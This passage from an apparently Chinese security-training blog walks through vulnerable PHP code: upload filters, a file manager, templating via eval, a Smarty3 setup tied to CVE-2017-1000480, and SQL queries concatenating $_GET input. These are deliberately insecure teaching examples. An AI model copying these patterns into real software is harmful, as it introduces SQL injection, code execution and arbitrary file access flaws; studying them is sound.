<span class="hljs-comment">// 如果文件后缀在白名单中，移动上传的文件到指定目录</span><br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-variable">$name</span>);<br>    <span class="hljs-comment">// 输出上传成功的提示信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功！&#x27;)&lt;/script&gt;&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ul></li><li><p>MIME文件类型过滤</p><ul><li><p>实现源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//MIME文件类型过滤</span><br>**<span class="hljs-comment">// 允许上传的文件 MIME 类型白名单</span><br><span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/png&#x27;</span>, <span class="hljs-string">&#x27;image/jpg&#x27;</span>, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>, <span class="hljs-string">&#x27;image/gif&#x27;</span>);**<br><span class="hljs-comment">// 检查文件 MIME 类型是否在允许的白名单中</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, <span class="hljs-variable">$allow_type</span>)) &#123;<br>    <span class="hljs-comment">// 如果文件 MIME 类型不在白名单中，输出非法文件类型信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;非法文件类型&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果文件 MIME 类型在白名单中，移动上传的文件到指定目录</span><br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-variable">$name</span>);<br>    <span class="hljs-comment">// 输出上传成功的提示信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><p>‍</p><p>‍</p><p>‍</p><h3 id="PHP应用-文件管理-包含-写入-删除-下载-上传-遍历-安全"><a href="#PHP应用-文件管理-包含-写入-删除-下载-上传-遍历-安全" class="headerlink" title="PHP应用&amp;文件管理&amp;包含&amp;写入&amp;删除&amp;下载&amp;上传&amp;遍历&amp;安全"></a>PHP应用&amp;文件管理&amp;包含&amp;写入&amp;删除&amp;下载&amp;上传&amp;遍历&amp;安全</h3><p><img src="/assets/image-20240701160839-gu4ibsc.png" alt="image">​</p><ol><li><p>文件显示</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getlist</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>    <span class="hljs-variable">$list</span> = []; <span class="hljs-comment">// 初始化文件列表数组</span><br>    <span class="hljs-variable">$hd</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$path</span>);<br>    <span class="hljs-comment">//循环读取目录中的文件名</span><br>    <span class="hljs-keyword">while</span>((<span class="hljs-variable">$file_name</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$hd</span>) )!== <span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-comment">//排除当前目录和父目录</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_name</span> != <span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; <span class="hljs-variable">$file_name</span> != <span class="hljs-string">&#x27;..&#x27;</span>) &#123;<br>            <span class="hljs-comment">//构建文件完整路径</span><br>            <span class="hljs-variable">$file_path</span> = <span class="hljs-string">&quot;<span class="hljs-subst">$path</span>/<span class="hljs-subst">$file_name</span>&quot;</span>;<br>            <span class="hljs-comment">//获取文件类型</span><br>            <span class="hljs-variable">$file_type</span> = <span class="hljs-title function_ invoke__">filetype</span>(<span class="hljs-variable">$file_path</span>);<br>            <span class="hljs-comment">//将文件信息存入列表数组</span><br>            <span class="hljs-variable">$list</span>[<span class="hljs-variable">$file_type</span>][] = <span class="hljs-keyword">array</span>( <span class="hljs-comment">//$file_type = dir 和 file $list[&#x27;dir&#x27;] 和  $list[&#x27;file&#x27;]</span><br>                <span class="hljs-string">&#x27;file_name&#x27;</span> =&gt; <span class="hljs-variable">$file_name</span>, <span class="hljs-comment">//文件名存储键值file_name</span><br>                <span class="hljs-string">&#x27;file_path&#x27;</span> =&gt; <span class="hljs-variable">$file_path</span>, <span class="hljs-comment">//文件路径存储键值file_path</span><br>                <span class="hljs-string">&#x27;file_size&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file_path</span>) / <span class="hljs-number">1024</span>), <span class="hljs-comment">//通过换算文件大小存储键值file_path</span><br>                <span class="hljs-string">&#x27;file_time&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y/m/d H:i:s&#x27;</span>, <span class="hljs-title function_ invoke__">filemtime</span>(<span class="hljs-variable">$file_path</span>)), <span class="hljs-comment">//获取文件时间并存储键值file_path</span><br>            );<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li><li><p>文件编辑、</p><p> <img src="/assets/image-20240701160935-io1yq4z.png" alt="image">​</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;edit&#x27;</span>:<br>        <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&quot;&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件名：&quot;</span>.<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件内容：&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;textarea name=&quot;code&quot; style=&quot;resize:none;&quot; rows=&quot;100&quot; cols=&quot;100&quot;&quot;&gt;&#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;&lt;/textarea&gt;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;submit&quot; value=&quot;提交&quot;&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/form&gt;&#x27;</span>;<br>        <span class="hljs-keyword">break</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$path</span>/<span class="hljs-subst">$file</span>&quot;</span>,<span class="hljs-string">&#x27;w+&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>文件删除</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;del&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-comment">//system(&quot;del $file&quot;);</span><br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure></li><li><p>文件下载</p><p> <img src="/assets/image-20240701161008-hrjclnq.png" alt="image">​</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;down&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: application/octet-stream&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=\&quot;&quot;</span> . <span class="hljs-variable">$file</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Length: &quot;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure></li></ol><p>‍</p><p>‍</p><p>‍</p><h3 id="PHP应用-模版引用-Smarty渲染-MVC模型-数据联动-RCE安全"><a href="#PHP应用-模版引用-Smarty渲染-MVC模型-数据联动-RCE安全" class="headerlink" title="PHP应用&amp;模版引用&amp;Smarty渲染&amp;MVC模型&amp;数据联动&amp;RCE安全"></a>PHP应用&amp;模版引用&amp;Smarty渲染&amp;MVC模型&amp;数据联动&amp;RCE安全</h3><ol><li><p>新闻列表</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 包含数据库配置文件</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<br><br><span class="hljs-comment">// 从GET请求中获取id参数，如果不存在则默认为1</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] ?? <span class="hljs-string">&#x27;1&#x27;</span>;<br><br><span class="hljs-comment">// 构建SQL查询语句</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from new where id=<span class="hljs-subst">$id</span>&quot;</span>;<br><br><span class="hljs-comment">// 执行查询并获取结果集</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><br><span class="hljs-comment">// 使用mysqli_fetch_row遍历结果集的每一行</span><br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-comment">// 输出标题，注意：mysqli_fetch_row返回的是枚举数组，索引从0开始</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;标题: &lt;title&gt;&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&quot;&lt;/title&gt;&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-comment">// 输出第二列数据</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-comment">// 输出第三列数据</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-comment">// 输出图片，注意：在HTML中使用$row[4]作为图片路径</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;<span class="hljs-subst">$row</span>[4]&#x27; width=&#x27;300&#x27; height=&#x27;300&#x27;&gt;&lt;/img&gt;&lt;br&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// 关闭数据库连接</span><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li><li><p>自编程模板引用</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 从文件中读取HTML模板内容</span><br><span class="hljs-variable">$template</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;new.html&#x27;</span>);<br><br><span class="hljs-comment">// 使用mysqli_fetch_row遍历结果集的每一行</span><br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-comment">// 从结果集中获取每一列的值，并存储到相应的变量中</span><br>    <span class="hljs-variable">$page_title</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];<br>    <span class="hljs-variable">$heading</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>];<br>    <span class="hljs-variable">$subheading</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">4</span>];<br>    <span class="hljs-variable">$item</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">5</span>];<br>&#125;<br><br><span class="hljs-comment">// 替换HTML模板中的占位符</span><br><span class="hljs-variable">$template</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&#123;page_title&#125;&#x27;</span>, <span class="hljs-variable">$page_title</span>, <span class="hljs-variable">$template</span>);<br><span class="hljs-variable">$template</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&#123;heading&#125;&#x27;</span>, <span class="hljs-variable">$subheading</span>, <span class="hljs-variable">$template</span>);<br><span class="hljs-variable">$template</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&#123;subheading&#125;&#x27;</span>, <span class="hljs-variable">$subheading</span>, <span class="hljs-variable">$template</span>);<br><span class="hljs-variable">$template</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&#123;content&#125;&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$template</span>);<br><span class="hljs-variable">$template</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&#123;$item&#125;&#x27;</span>, <span class="hljs-variable">$item</span>, <span class="hljs-variable">$template</span>);<br><br><span class="hljs-comment">// 将PHP代码嵌入HTML模板中并执行</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;?&gt;&#x27;</span> . <span class="hljs-variable">$template</span>);<br><br><span class="hljs-comment">// 关闭数据库连接</span><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con</span>);<br><br></code></pre></td></tr></table></figure></li><li><p>Smarty模板引用</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 引入 Smarty 类文件</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;smarty/libs/Smarty.class.php&#x27;</span>);<br><br><span class="hljs-comment">// 创建 Smarty 实例</span><br><span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Smarty</span>;<br><br><span class="hljs-comment">// 设置 Smarty 相关属性</span><br><span class="hljs-variable">$smarty</span>-&gt;template_dir = <span class="hljs-string">&#x27;smarty/templates/&#x27;</span>;  <span class="hljs-comment">// 设置模板文件的目录</span><br><span class="hljs-comment">// 指定 Smarty 模板文件所在的目录，这里使用了相对路径，可以根据实际情况修改</span><br><span class="hljs-variable">$smarty</span>-&gt;compile_dir = <span class="hljs-string">&#x27;smarty/templates_c/&#x27;</span>;  <span class="hljs-comment">// 设置编译文件的目录</span><br><span class="hljs-comment">// 指定 Smarty 编译生成的模板文件所存放的目录，用于存放 Smarty 编译生成的 PHP 文件</span><br><span class="hljs-variable">$smarty</span>-&gt;cache_dir = <span class="hljs-string">&#x27;smarty/cache/&#x27;</span>;  <span class="hljs-comment">// 设置缓存文件的目录</span><br><span class="hljs-comment">// 指定 Smarty 缓存文件的存放目录，用于存放 Smarty 缓存文件</span><br><span class="hljs-variable">$smarty</span>-&gt;config_dir = <span class="hljs-string">&#x27;smarty/configs/&#x27;</span>;  <span class="hljs-comment">// 设置配置文件的目录</span><br><span class="hljs-comment">// 指定 Smarty 配置文件的存放目录，用于存放 Smarty 配置文件</span><br><br><span class="hljs-comment">// 赋值变量到模板中</span><br><span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;title&#x27;</span>, <span class="hljs-string">&#x27;欢迎使用 Smarty&#x27;</span>);  <span class="hljs-comment">// 将变量 &#x27;title&#x27; 赋值为 &#x27;欢迎使用 Smarty&#x27;</span><br><br><span class="hljs-comment">// 显示模板</span><br><span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;index.tpl&#x27;</span>);  <span class="hljs-comment">// 使用 &#x27;index.tpl&#x27; 模板文件进行显示</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li><li><p>Smarty3模板引用—存在RCE漏洞</p><p> <img src="/assets/image-20240701211953-90ho7or.png" alt="image">​</p><p> <img src="/assets/image-20240701211915-dquprl6.png" alt="image">​</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 定义 Smarty 根目录路径常量</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SMARTY_ROOT_DIR&#x27;</span>, <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">__DIR__</span>));<br><br><span class="hljs-comment">// 定义 Smarty 编译文件目录路径常量</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SMARTY_COMPILE_DIR&#x27;</span>, SMARTY_ROOT_DIR . <span class="hljs-string">&#x27;/smarty3/tmp/templates_c&#x27;</span>);<br><br><span class="hljs-comment">// 定义 Smarty 缓存文件目录路径常量</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;SMARTY_CACHE_DIR&#x27;</span>, SMARTY_ROOT_DIR . <span class="hljs-string">&#x27;/smarty3/tmp/cache&#x27;</span>);<br><br><span class="hljs-comment">// 包含 Smarty 类文件</span><br><span class="hljs-keyword">include_once</span>(SMARTY_ROOT_DIR . <span class="hljs-string">&#x27;/smarty3/libs/Smarty.class.php&#x27;</span>);<br><br><span class="hljs-comment">// 自定义 Smarty 资源类，继承自 Smarty_Resource_Custom</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">testSmarty</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Smarty_Resource_Custom</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// 重写 fetch 方法</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fetch</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, &amp;<span class="hljs-variable">$source</span>, &amp;<span class="hljs-variable">$mtime</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 自定义模板内容，这里只是示例，实际情况应该从数据库或其他来源获取模板内容</span><br>        <span class="hljs-variable">$template</span> = <span class="hljs-string">&quot;CVE-2017-1000480 smarty PHP code injection&quot;</span>;<br>        <span class="hljs-comment">// 将模板内容赋值给 $source 参数</span><br>        <span class="hljs-variable">$source</span> = <span class="hljs-variable">$template</span>;<br>        <span class="hljs-comment">// 设置模板修改时间为当前时间</span><br>        <span class="hljs-variable">$mtime</span> = <span class="hljs-title function_ invoke__">time</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 创建 Smarty 实例</span><br><span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Smarty</span>();<br><br><span class="hljs-comment">// 设置 Smarty 缓存文件目录</span><br><span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">setCacheDir</span>(SMARTY_CACHE_DIR);<br><br><span class="hljs-comment">// 设置 Smarty 编译文件目录</span><br><span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">setCompileDir</span>(SMARTY_COMPILE_DIR);<br><br><span class="hljs-comment">// 注册自定义资源类型 &#x27;test&#x27;，并指定使用 testSmarty 类处理该资源类型</span><br><span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">registerResource</span>(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-keyword">new</span> testSmarty);<br><br><span class="hljs-comment">// 获取要显示的模板名称，并通过 $_GET[&#x27;eval&#x27;] 获取，存在安全风险，应谨慎使用</span><br><span class="hljs-variable">$templateName</span> = <span class="hljs-string">&#x27;test:&#x27;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;eval&#x27;</span>];<br><br><span class="hljs-comment">// 显示模板</span><br><span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-variable">$templateName</span>);<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li></ol><p>‍</p><p>‍</p><p>‍</p><h3 id="PHP应用-TP框架-路由访问-对象操作-内置过滤绕过-核心漏洞"><a href="#PHP应用-TP框架-路由访问-对象操作-内置过滤绕过-核心漏洞" class="headerlink" title="PHP应用&amp;TP框架&amp;路由访问&amp;对象操作&amp;内置过滤绕过&amp;核心漏洞"></a>PHP应用&amp;TP框架&amp;路由访问&amp;对象操作&amp;内置过滤绕过&amp;核心漏洞</h3><ol><li><p>安全写法</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">request</span>()-&gt;<span class="hljs-title function_ invoke__">param</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br><span class="hljs-variable">$data</span>=<span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">table</span>(<span class="hljs-string">&#x27;news&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&#x27;id&#x27;</span>,<span class="hljs-variable">$id</span>)-&gt;<span class="hljs-title function_ invoke__">find</span>();<br></code></pre></td></tr></table></figure></li><li><p>半安全写法</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//用一半安全写法 有安全隐患</span><br>   <span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">request</span>()-&gt;<span class="hljs-title function_ invoke__">param</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br>   <span class="hljs-variable">$data</span>=<span class="hljs-title class_">Db</span>::<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from news where id=<span class="hljs-subst">$id</span>&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p>原生写法</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 从GET请求中获取id参数，如果不存在则默认为1</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] ?? <span class="hljs-string">&#x27;1&#x27;</span>;<br><br><span class="hljs-comment">// 构建SQL查询语句</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from news where id=<span class="hljs-subst">$id</span>&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br><br><span class="hljs-comment">// 执行查询并获取结果集</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><br><span class="hljs-comment">// 使用mysqli_fetch_row遍历结果集的每一行</span><br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-comment">// 从结果集中获取每一列的值，并存储到相应的变量中</span><br>    <span class="hljs-variable">$page_title</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];<br>    <span class="hljs-variable">$heading</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>];<br>    <span class="hljs-variable">$subheading</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>];<br>    <span class="hljs-variable">$content</span> 